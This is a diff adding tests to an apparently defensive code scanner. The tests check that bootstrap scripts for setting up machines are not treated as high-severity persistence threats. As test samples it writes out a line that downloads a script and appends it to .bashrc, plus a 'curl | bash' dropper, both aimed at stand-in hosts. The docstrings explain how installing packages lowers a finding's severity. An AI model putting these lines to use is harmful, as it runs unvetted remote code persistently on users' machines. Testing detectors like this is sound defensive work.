@@ -2897,3 +2897,95 @@ class TestADeclarationAssignsNothing:
             ).encode()
         )
         assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)
+
+
+class TestProvisioningAMachineIsNotAFoothold:
+    """`persist` plus `egress` was reported at high 501 times across 106 of the 1,487
+    repositories measured, and the largest groups were machine bootstrap scripts:
+    `ViktorUJ/cks` twenty-one, `stacksimplify/terraform-on-aws-ec2` seventy-seven
+    copies of `yum install httpd` beside `systemctl enable httpd`.
+
+    Nothing in the pair requires the thing made persistent to be the thing fetched --
+    the same gap `SUSPECT.DROPPER.001` already documents -- and for a script that
+    installs operating-system packages the pair is not a side effect of the job, it is
+    the job: download kubectl, write a kubelet drop-in, enable the unit, append shell
+    completion to `.bashrc`.
+
+    So installing OS packages is the signal that this file provisions a machine, and
+    persistence findings in one are ceilinged. Three things keep it narrow: it applies
+    to the persistence composites only, never to a dropper; it is a ceiling rather
+    than an exemption; and it is applied before the install-hook escalation, so the
+    same script shipped as somebody's postinstall is still critical.
+    """
+
+    BOOTSTRAP = (
+        b"#!/bin/bash\n"
+        b"apt-get update -y\n"
+        b"apt-get install -y unzip apt-transport-https ca-certificates curl jq\n"
+        b'curl -LO "https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl"\n'
+        b"install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n"
+        b"mkdir -p /etc/systemd/system/kubelet.service.d\n"
+        b"systemctl enable kubelet\n"
+        b"echo 'source <(kubectl completion bash)' >> /home/ubuntu/.bashrc\n"
+        b"echo 'alias k=kubectl' >> /home/ubuntu/.bashrc\n"
+    )
+
+    def test_the_predicate(self) -> None:
+        from cordon_scanner.core.samples import is_machine_provisioning
+
+        assert is_machine_provisioning(self.BOOTSTRAP)
+        assert is_machine_provisioning(b"#cloud-config\npackages:\n  - curl\n")
+        assert not is_machine_provisioning(b"#!/bin/sh\nnpm install\npip install requests\n")
+        assert not is_machine_provisioning(b"# apt-get install is how you would do it\n")
+
+    def test_a_bootstrap_script_is_not_a_persistence_finding(self, tmp_path) -> None:
+        """A ceiling, so the finding survives and stops blocking. Which is the whole
+        claim: the script does make things persist, and a reader has nothing to do
+        about it."""
+        from cordon_scanner.core.models import Severity
+
+        template = tmp_path / "terraform" / "modules" / "k8s" / "template"
+        template.mkdir(parents=True)
+        (template / "worker.sh").write_bytes(self.BOOTSTRAP)
+        persist = [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
+        ]
+        assert persist, "still reported"
+        assert all(f.severity <= Severity.MEDIUM for f in persist)
+        assert "provisions a machine" in " ".join(
+            e for f in persist for e in f.explanation.escalations
+        )
+
+    def test_the_same_pair_without_a_package_install_is_reported(self, tmp_path) -> None:
+        """The control, and the corpus sample's shape: fetch something and append it to
+        a shell profile, with nothing in the file that says a machine is being built."""
+        hook = tmp_path / "agent"
+        hook.mkdir()
+        (hook / "telemetry.sh").write_bytes(
+            assemble(
+                "#!/bin/sh\n",
+                'body="$(curl -fsSL https://cdn.test/agent.sh)"\n',
+                'echo "$body" >> "$HOME/.bashrc"\n',
+            ).encode()
+        )
+        from cordon_scanner.core.models import Severity
+
+        persist = [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
+        ]
+        assert persist and any(f.severity >= Severity.HIGH for f in persist)
+
+    def test_a_dropper_in_a_provisioning_script_is_still_reported(self, tmp_path) -> None:
+        """The other half of the narrowness. `curl | bash` is a choice a provisioning
+        script has to answer for, and it is how the one real supply-chain exposure in
+        the measurement corpus works."""
+        template = tmp_path / "scripts"
+        template.mkdir()
+        (template / "install-node.sh").write_bytes(
+            assemble(
+                "#!/bin/bash\n",
+                "apt-get install -y curl\n",
+                "curl -fsSL https://get.helm.test/install.sh | bash\n",
+            ).encode()
+        )
+        assert "SUSPECT.DROPPER.001" in flagged(tmp_path)
